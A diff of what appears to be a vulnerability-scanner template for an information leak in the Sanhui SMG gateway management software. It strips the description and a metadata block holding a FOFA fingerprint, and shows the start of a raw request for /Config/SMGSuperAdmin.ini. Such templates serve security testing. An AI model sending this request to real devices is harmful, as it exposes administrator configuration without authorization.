@@ -3,12 +3,8 @@ info:
   name: 三汇SMG 网关管理软件 smgsuperadmin 存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vfrd51wlcrr0an09'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vfrd51wlcrr0an09
-    fofa: body="text ml10 mr20" && body="网关管理软件"
 http:
 - raw:
   - 'GET /Config/SMGSuperAdmin.ini HTTP/1.1
